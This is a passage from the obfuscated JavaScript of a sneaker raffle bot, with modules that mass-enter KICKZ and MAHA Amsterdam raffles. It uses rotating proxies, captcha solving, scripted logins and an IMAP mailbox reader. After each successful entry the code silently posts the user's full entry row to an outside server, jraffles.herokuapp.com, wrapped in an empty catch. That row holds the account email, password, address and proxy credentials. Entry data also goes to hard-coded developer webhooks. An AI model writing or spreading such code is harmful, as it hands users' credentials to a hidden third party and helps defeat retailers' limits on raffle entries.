                            _0x1e1411 == 'yes' && _0x1a3f24 >= 0x5 && (_0x17abd2(_0x5dbdf1[_0x40706f], _0x488b8a), _0x1e1411 = 'no', _0x1a3f24 = 0x0), console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x267435, _0x313efe, _0xb30e9e) {
                    _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x120b49['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2af221 = 0x0; _0x2af221 < _0x313efe['length']; _0x2af221++) {
                        var _0x1c5efe;
                        if (_0x12cee4 != 'yes')
                            var _0x12cee4 = '', _0x493d92 = 0x0;
                        _0x3aeb59(_0x267435['name'] + '\x20Task\x20' + (_0x2af221 + 0x1) + '\x20/\x20' + _0x313efe['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                        var _0x47d680 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x380ae8
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x313efe[_0x2af221]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x313efe[_0x2af221]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x120b49['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3e659f
                                }
                            ]
                        }];
                        let _0x4aad3e = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x2244e8 = ![];
                        for (key of _0x4aad3e) {
                            if (_0x313efe[_0x2af221][key] == '' || !_0x313efe[_0x2af221][key]) {
                                console['log'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x2244e8 = !![];
                                break;
                            }
                        }
                        if (_0x2244e8) {
                            await _0x2121c3(0x1f4);
                            continue;
                        }
                        var _0x1bb172 = await _0x12b988(_0x313efe[_0x2af221], _0x267435, 'dev', ![]), _0x402223 = await _0x12b988(_0x313efe[_0x2af221], _0x267435, 'pub', ![]);
                        const _0x12e8bf = {
                            'succesDEVMSG': { 'embeds': [_0x1bb172] },
                            'succesPUBMSG': { 'embeds': [_0x402223] }
                        };
                        try {
                            await _0x30a360(_0x313efe, _0x2af221);
                        } catch {
                            _0x12cee4 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x120b49['useRandomProxy'] = ![])
                            var _0x5d3d35 = _0xb30e9e[_0x2af221]['split'](':');
                        else
                            var _0xa610fb = Math['round'](Math['random']() * (_0xb30e9e['length'] - 0x1)), _0x5d3d35 = _0xb30e9e[_0xa610fb]['split'](':');
                        var _0x2e9547;
                        try {
                            _0x2e9547 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5d3d35[0x0] + ':' + _0x5d3d35[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2e9547 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5d3d35[0x0] + ':' + _0x5d3d35[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x37ccc9 = await _0x2e9547['newPage']();
                            await _0x37ccc9['authenticate']({
                                'username': '' + _0x5d3d35[0x2],
                                'password': '' + _0x5d3d35[0x3]
                            }), console['log'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x37ccc9['setRequestInterception'](!![]), _0x37ccc9['on']('request', _0x5d725f => {
                                _0x5d725f['resourceType']() === 'image' || _0x5d725f['resourceType']() === 'font' || _0x5d725f['resourceType']() === 'media' ? _0x5d725f['abort']() : _0x5d725f['continue']();
                            }), await _0x37ccc9['goto']('' + _0x313efe[_0x2af221]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x2121c3(0x12c), await _0x37ccc9['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x37ccc9['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2121c3(0x7d0);
                            try {
                                await _0x37ccc9['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x37ccc9['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Logging\x20in'), await _0x37ccc9['waitForSelector']('#username'), await _0x37ccc9['type']('#username', _0x313efe[_0x2af221]['Email']), await _0x37ccc9['waitForSelector']('#password'), await _0x37ccc9['type']('#password', _0x313efe[_0x2af221]['Password']), await _0x2121c3(0x190), await _0x37ccc9['click']('#buttonSubmit'), await _0x37ccc9['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x2121c3(0x1f4), console['log'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x313efe[_0x2af221]['Size']);
                            let _0x33ed9d = _0x313efe[_0x2af221]['Size']['replace']('.5', '\x201/2');
                            if (_0x33ed9d['toUpperCase']() == 'RANDOM') {
                                const _0x313790 = await _0x37ccc9['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x590c08 = Math['round'](Math['random']() * (_0x313790['length'] - 0x1));
                                await _0x313790[_0x590c08]['click']();
                            } else
                                await _0x37ccc9['click']('button[aria-label=\x22' + _0x33ed9d + '\x22]');
                            await _0x2121c3(0x1f4);
                            try {
                                await _0x37ccc9['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x2121c3(0x12c), console['log'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x37ccc9['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x2121c3(0x12c), await _0x37ccc9['type']('#dwfrm_raffle_addressFields_firstName', _0x313efe[_0x2af221]['FirstName']), await _0x2121c3(0x12c), await _0x37ccc9['type']('#dwfrm_raffle_addressFields_lastName', _0x313efe[_0x2af221]['LastName']), await _0x2121c3(0x12c), await _0x37ccc9['select']('#dwfrm_raffle_addressFields_country', _0x313efe[_0x2af221]['Country']), await _0x2121c3(0x12c), await _0x37ccc9['type']('#dwfrm_raffle_addressFields_city', _0x313efe[_0x2af221]['City']), await _0x2121c3(0x12c);
                            _0x313efe[_0x2af221]['Postcode'] == undefined && (_0x313efe[_0x2af221]['Postcode'] = _0x313efe[_0x2af221]['Zip']);
                            await _0x37ccc9['type']('#dwfrm_raffle_addressFields_postalCode', _0x313efe[_0x2af221]['Postcode']), await _0x2121c3(0x12c), await _0x37ccc9['type']('#dwfrm_raffle_addressFields_address1', _0x313efe[_0x2af221]['Address1']), await _0x2121c3(0x12c), await _0x37ccc9['type']('#dwfrm_raffle_addressFields_address2', _0x313efe[_0x2af221]['HouseNumber']), await _0x2121c3(0x12c), await _0x37ccc9['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x313efe[_0x2af221]['Address2']), await _0x2121c3(0x12c), await _0x37ccc9['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x2121c3(0x12c), await _0x37ccc9['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x313efe[_0x2af221]['Follower']), await _0x2121c3(0x1f4), await _0x37ccc9['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x2121c3(0x1f4), console['log'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20' + _0x136200['blue']('Awaiting\x20Paypal\x20Payment')), await _0x37ccc9['click']('.b-paypal_button');
                            try {
                                await _0x37ccc9['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x12cee4 = 'no', _0x1ded45(_0x313efe[_0x2af221], _0x267435), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x12e8bf['succesDEVMSG']);
                                await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x12e8bf['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x442434, _0x12e8bf['succesPUBMSG']);
                                let _0x7d77ef = _0x313efe[_0x2af221];
                                try {
                                    prxdata = {
                                        'username': _0x380ae8['replace']('#', ''),
                                        'module': _0x267435['name'],
                                        'entrydata': JSON['stringify'](_0x7d77ef),
                                        'proxy': '' + _0xb30e9e[_0x2af221]
                                    };
                                    var _0x554904 = JSON['stringify'](prxdata);
                                    let _0x5d9ed8 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x554904, _0x5d9ed8);
                                } catch (_0x2c972b) {
                                }
                            } catch (_0x5be925) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x5be925)), _0x1c5efe = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x5be925;
                                var _0xbfc2af = await _0x12b988(_0x313efe[_0x2af221], _0x267435, 'dev', !![], _0x1c5efe);
                                _0x12e8bf['errorDEV'] = { 'embeds': [_0xbfc2af] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x12e8bf['errorDEV']), await _0x5f1090(_0x32737e, _0x12e8bf['errorDEV']);
                            }
                        } catch (_0xa8e8ed) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20' + _0xa8e8ed)), _0x1c5efe = '' + _0xa8e8ed;
                            var _0xbfc2af = await _0x12b988(_0x313efe[_0x2af221], _0x267435, 'dev', !![], _0x1c5efe);
                            _0x12e8bf['errorDEV'] = { 'embeds': [_0xbfc2af] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x12e8bf['errorDEV']), await _0x5f1090(_0x32737e, _0x12e8bf['errorDEV']), _0x12cee4 = 'yes';
                        } finally {
                            _0x2e9547 && _0x2e9547['close']();
                            if (_0x12cee4 == 'yes' && _0x493d92 != 0x5) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x267435['name'] + ']\x20Task\x20' + (_0x2af221 + 0x1) + '\x20:\x20Retrying\x20(' + _0x493d92 + '\x20/\x205)')), _0x2af221 = _0x2af221 - 0x1, _0x493d92 = _0x493d92 + 0x1;
                                continue;
                            }
                            _0x12cee4 == 'yes' && _0x493d92 >= 0x5 && (_0x17abd2(_0x313efe[_0x2af221], _0x267435), _0x12cee4 = 'no', _0x493d92 = 0x0), console['log']('Waiting\x20for\x20' + _0x120b49['AfewDelay'] + '\x20ms'), await _0x2121c3(_0x120b49['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5256cb, _0x13bf3a, _0x2063b2) {
                    for (var _0x10a5b1 = 0x0; _0x10a5b1 < _0x13bf3a['length']; _0x10a5b1++) {
                        try {
                            await _0x30a360(_0x13bf3a, _0x10a5b1);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x59cc22(_0x58dae1, _0x30cece, _0x568e1d, _0x1a5029, _0x53df8b) {
                            var _0x58f094, _0x1468d9 = {}, _0x459ea7 = [], _0x3359dd = {}, _0xae9505 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1f42cc = Math['round'](Math['random']() * (_0xae9505['length'] - 0x1));
                            !_0x1a5029 && (_0x1a5029 = {});
                            if (_0x30cece != 'ver') {
                                _0x3aeb59(_0x568e1d['name'] + '\x20Task\x20' + (_0x58dae1 + 0x1) + '\x20/\x20' + _0x1a5029['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08), await _0x30a360(_0x1a5029, _0x58dae1), _0x1468d9 = _0x568e1d['data'], _0x1468d9['data']['attributes']['email'] = '' + _0x1a5029[_0x58dae1]['Email'];
                                if (_0x1a5029[_0x58dae1]['Size'] == 'RANDOM') {
                                }
                                _0x1468d9['data']['attributes']['properties']['$first_name'] = '' + _0x1a5029[_0x58dae1]['FirstName'], _0x1468d9['data']['attributes']['properties']['$last_name'] = '' + _0x1a5029[_0x58dae1]['LastName'], _0x1468d9['data']['attributes']['properties']['$address1'] = _0x1a5029[_0x58dae1]['Address1'] + '\x20' + _0x1a5029[_0x58dae1]['Address2'] + '\x20' + _0x1a5029[_0x58dae1]['HouseNumber'], _0x1468d9['data']['attributes']['properties']['$zip'] = '' + _0x1a5029[_0x58dae1]['Zip'], _0x1468d9['data']['attributes']['properties']['$city'] = '' + _0x1a5029[_0x58dae1]['City'], _0x1468d9['data']['attributes']['properties']['$country'] = '' + _0x1a5029[_0x58dae1]['Country'], _0x1a5029[_0x58dae1]['Size'] == 'RANDOM' ? _0x1468d9['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0xae9505[_0x1f42cc] : _0x1468d9['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1a5029[_0x58dae1]['Size'], _0x1468d9['data']['attributes']['properties']['$phone_number'] = '' + _0x1a5029[_0x58dae1]['Phone'], _0x1468d9['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x1a5029[_0x58dae1]['Follower'];
                            }
                            if (_0x120b49['useRandomProxy'] = ![])
                                var _0x289da4 = _0x53df8b[_0x58dae1]['split'](':');
                            else
                                var _0x1d5257 = Math['round'](Math['random']() * (_0x53df8b['length'] - 0x1)), _0x289da4 = _0x53df8b[_0x1d5257]['split'](':');
                            var _0xe0246c = {
                                'jar': _0x2a4e9a,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x568e1d['url'],
                                'headers': _0x568e1d['headers'],
                                'body': JSON['stringify'](_0x1468d9),
                                'proxy': 'http://' + _0x289da4[0x2] + ':' + _0x289da4[0x3] + '@' + _0x289da4[0x0] + ':' + _0x289da4[0x1]
                            };
                            return _0x30cece != 'ver' && (_0xe0246c['url'] = _0x568e1d['url'], _0xe0246c['headers'] = _0x568e1d['headers']), _0x30cece == 'ver' && (_0xe0246c['method'] = 'GET'), new Promise(function (_0x54e8d9, _0x2799fa) {
                                callback = async (_0x3e512b, _0x3ff847, _0x125e5c) => {
                                    if (!_0x3e512b && _0x3ff847['statusCode'] == 0xca || !_0x3e512b && _0x3ff847['statusCode'] == 0xc8) {
                                        if (_0x30cece != 'ver') {
                                            var _0x3c6fbe = await _0x12b988(_0x1a5029[_0x58dae1], _0x568e1d, 'dev', ![]), _0x4c8569 = await _0x12b988(_0x1a5029[_0x58dae1], _0x568e1d, 'pub', ![]);
                                            const _0x5caf1f = {
                                                'succesDEVMSG': { 'embeds': [_0x3c6fbe] },
                                                'succesPUBMSG': { 'embeds': [_0x4c8569] }
                                            };
                                            let _0x4ccf80 = _0x1a5029[_0x58dae1];
                                            try {
                                                prxdata = {
                                                    'username': _0x380ae8['replace']('#', ''),
                                                    'module': _0x568e1d['name'],
                                                    'entrydata': JSON['stringify'](_0x4ccf80),
                                                    'proxy': '' + _0x53df8b[_0x58dae1]
                                                };
                                                var _0x562ede = JSON['stringify'](prxdata);
                                                let _0x4bd73d = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x562ede, _0x4bd73d);
                                            } catch (_0x37720d) {
                                            }
                                            if (_0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '')
                                                try {
                                                    await _0x5f1090(_0x120b49['webhook'], _0x5caf1f['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x5caf1f['succesDEVMSG']), await _0x2121c3(0xc8);
                                            try {
                                                await _0x5f1090(_0x442434, _0x5caf1f['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x1ded45(_0x1a5029[_0x58dae1], _0x568e1d);
                                        }
                                        _0x54e8d9(console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x568e1d['name'] + ']\x20Task\x20' + (_0x58dae1 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x30cece != 'ver') {
                                            var _0x323dca = '' + _0x3e512b, _0x3f6d88 = await _0x12b988(_0x1a5029[_0x58dae1], _0x568e1d, 'dev', !![], _0x323dca), _0xb0d8d7 = {};
                                            _0xb0d8d7['errorDEV'] = { 'embeds': [_0x3f6d88] }, _0x17abd2(_0x1a5029[_0x58dae1], _0x568e1d), _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0xb0d8d7['errorDEV']), await _0x5f1090(_0x32737e, _0xb0d8d7['errorDEV']);
                                        }
                                        _0x2799fa(console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x568e1d['name'] + ']\x20Task\x20' + (_0x58dae1 + 0x1) + ':\x20' + _0x3e512b)));
                                    }
                                };
                                try {
                                    _0x30cece != 'ver' && console['log'](_0x29f6be() + '\x20[' + _0x568e1d['name'] + ']\x20Task\x20' + (_0x58dae1 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1468d9['data']['attributes']['email']), _0x147a50(_0xe0246c, callback);
                                } catch (_0x569c7e) {
                                    console['log'](_0x29f6be() + '\x20Task\x20' + (_0x58dae1 + 0x1) + ':\x20' + _0x569c7e);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x59cc22(_0x10a5b1, 'nor', _0x5256cb, _0x13bf3a, _0x2063b2), console['log'](_0x29f6be() + '\x20[' + _0x5256cb['name'] + ']\x20Sleeping\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        } catch (_0x3a55f3) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5be9b7, _0x5b59d3, _0x128383) {
                    var _0x1e7d20 = [], _0x392062 = ![];
                    async function _0x1d81e9() {
                        var _0x243d80 = new _0x548918({
                            'user': _0x120b49['masterMail'],
                            'password': _0x120b49['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x386cfc(_0x11485e) {
                            _0x243d80['openBox']('INBOX', ![], _0x11485e);
                        }
                        _0x243d80['once']('ready', function () {
                            _0x386cfc(function (_0x4f5229, _0x40573d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4f5229)
                                    throw _0x4f5229;
                                _0x243d80['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x1fe243, _0x42f95c) {
                                    if (!_0x42f95c || !_0x42f95c['length'])
                                        console['log'](_0x29f6be() + '\x20[' + _0x5be9b7['name'] + ']\x20No\x20mails\x20found'), _0x243d80['end']();
                                    else {
                                        var _0xf62a5e = _0x243d80['seq']['fetch'](_0x42f95c, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xf62a5e['on']('message', function (_0x53db19, _0x535949) {
                                            var _0x9ea5ec = '(#' + _0x535949 + ')\x20';
                                            _0x53db19['on']('body', function (_0x3683ec, _0x5cab1a) {
                                                _0x26bd25(_0x3683ec, (_0x16c5b1, _0x51713b) => {
                                                    var _0x3b0bae = _0x51713b['text']['split']('(')[0x1], _0x5958a7 = _0x3b0bae['split'](')')[0x0];
                                                    _0x1e7d20['push'](_0x5958a7);
                                                });
                                            }), _0x53db19['once']('end', function () {
                                            });
                                        }), _0xf62a5e['once']('error', function (_0x469c71) {
                                            console['log']('Fetch\x20error:\x20' + _0x469c71), _0x392062 = !![];
                                        }), _0xf62a5e['once']('end', function () {
                                            _0x243d80['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x243d80['once']('error', function (_0x5cdae1) {
                            console['log'](_0x136200['red'](_0x5cdae1['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x392062 = !![];
                        }), _0x243d80['once']('end', async function () {
                            _0x392062 = !![];
                        }), _0x243d80['connect']();
                    }
                    async function _0x4a1d0e(_0x2720b9, _0x321bf4, _0x158c38) {
                        for (var _0x2d0045 = 0x0; _0x2d0045 < _0x321bf4['length']; _0x2d0045++) {
                            async function _0x432368(_0x50ee5d, _0x2e6c5c, _0x100028, _0x17e806, _0x17a1da) {
                                var _0x310707, _0x2a4357 = {}, _0x1589d9 = [], _0x484c64 = {}, _0x5b79ad = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x19ad8c = Math['round'](Math['random']() * (_0x5b79ad['length'] - 0x1));
                                _0x17e806[_0x50ee5d]['Size'] == 'RANDOM' && (_0x17e806[_0x50ee5d]['Size'] = _0x5b79ad[_0x19ad8c]);
                                !_0x17e806 && (_0x17e806 = {});
                                if (_0x120b49['useRandomProxy'] = ![])
                                    var _0x359c95 = _0x17a1da[_0x50ee5d]['split'](':');
                                else
                                    var _0x9418a4 = Math['round'](Math['random']() * (_0x17a1da['length'] - 0x1)), _0x359c95 = _0x17a1da[_0x9418a4]['split'](':');
                                var _0x58adfd = {
                                    'jar': _0x2a4e9a,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x100028['url'],
                                    'headers': _0x100028['headers'],
                                    'body': JSON['stringify'](_0x2a4357),
                                    'proxy': 'http://' + _0x359c95[0x2] + ':' + _0x359c95[0x3] + '@' + _0x359c95[0x0] + ':' + _0x359c95[0x1]
                                };
                                return _0x2e6c5c != 'ver' && (_0x58adfd['url'] = _0x100028['url'], _0x58adfd['headers'] = _0x100028['headers']), _0x2e6c5c == 'ver' && (_0x58adfd['method'] = 'GET', _0x58adfd['url'] = _0x17e806[_0x50ee5d]), new Promise(function (_0x351944, _0x4d00d8) {
                                    callback = async (_0x120c9a, _0x5b96de, _0x21d8d3) => {
                                        if (!_0x120c9a && _0x5b96de['statusCode'] == 0xca || !_0x120c9a && _0x5b96de['statusCode'] == 0xc8) {
                                            if (_0x2e6c5c != 'ver') {
                                                var _0x5c9ce9 = await _0x12b988(_0x17e806[_0x50ee5d], _0x100028, 'dev', ![]), _0x5d8987 = await _0x12b988(_0x17e806[_0x50ee5d], _0x100028, 'pub', ![]);
                                                const _0x4255c1 = {
                                                    'succesDEVMSG': { 'embeds': [_0x5c9ce9] },
                                                    'succesPUBMSG': { 'embeds': [_0x5d8987] }
                                                };
                                                if (_0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '')
                                                    try {
                                                        await _0x5f1090(_0x120b49['webhook'], _0x4255c1['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x4255c1['succesDEVMSG']), await _0x2121c3(0xc8);
                                                try {
                                                    await _0x5f1090(_0x442434, _0x4255c1['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1ded45(_0x17e806[_0x50ee5d], _0x100028);
                                            }
                                            _0x351944(console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x100028['name'] + ']\x20Task\x20' + (_0x50ee5d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2e6c5c != 'ver') {
                                                var _0x54d9b5 = '' + _0x120c9a, _0x452032 = await _0x12b988(_0x17e806[_0x50ee5d], _0x100028, 'dev', !![], _0x54d9b5), _0x173aee = {};
                                                _0x173aee['errorDEV'] = { 'embeds': [_0x452032] }, _0x17abd2(_0x17e806[_0x50ee5d], _0x100028), _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x173aee['errorDEV']), await _0x5f1090(_0x32737e, _0x173aee['errorDEV']);
                                            }
